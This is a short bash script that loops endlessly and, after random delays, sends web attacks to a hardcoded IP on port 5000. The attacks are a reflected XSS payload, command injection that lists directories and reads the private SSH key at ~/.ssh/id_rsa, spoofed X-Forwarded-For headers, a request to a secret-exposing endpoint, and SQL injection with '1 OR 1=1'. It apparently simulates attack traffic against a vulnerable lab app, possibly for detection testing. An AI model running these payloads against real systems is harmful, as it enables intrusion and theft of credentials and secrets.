#!/usr/bin/env bash


victim_IP="3.96.142.208"
malicious_IPs=("45.227.253.55" "222.186.30.50" "89.248.167.131")

while true; do
  attack=$((RANDOM % 5 + 1))
  delay=$((RANDOM % 15 + 1))

  echo "[*] Waiting $delay seconds before next attack..."
  sleep $delay

  case $attack in
    1)
      echo "[*] Running Attack 1 (XSS)"
      curl -s "http://$victim_IP:5000/greet?name=<script>alert('GotYou :)')</script>"
      ;;
    2)
      echo "[*] Running Attack 2 (Command Injection)"
      curl -s "http://$victim_IP:5000/cmd?exec=ls%20-la%20/"
      curl -s "http://$victim_IP:5000/cmd?exec=ls%20-l%20~/.ssh"
      curl -s "http://$victim_IP:5000/cmd?exec=cat%20~/.ssh/id_rsa"
      ;;
    3)
      ip=${malicious_IPs[$RANDOM % ${#malicious_IPs[@]}]}
      echo "[*] Running Attack 3 (Fake X-Forwarded-For: $ip)"
      curl -s -H "X-Forwarded-For: $ip" "http://$victim_IP:5000/client-ip"
      ;;
    4)
      echo "[*] Running Attack 4 (Env var exposure)"
      curl -s "http://$victim_IP:5000/secret"
      ;;
    5)
      echo "[*] Running Attack 5 (SQL Injection)"
      curl -s "http://$victim_IP:5000/user?id=123"
      curl -s "http://$victim_IP:5000/user?id=1%20OR%201=1"
      ;;
  esac
done
